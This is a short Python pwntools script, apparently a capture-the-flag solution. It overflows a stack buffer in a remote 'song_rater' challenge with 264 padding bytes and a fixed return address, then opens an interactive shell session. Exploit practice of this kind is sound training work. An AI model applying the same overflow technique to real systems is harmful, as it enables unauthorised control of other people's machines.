from pwn import *

# io = process('./song_rater')
io = remote("wish-you-were-here--rednex-4095.ctf.kitctf.de", "443", ssl=True)

print(io.recv())

payload = b'A' * 264 + p64(0x0000000000401196)

io.sendline(payload)

io.interactive()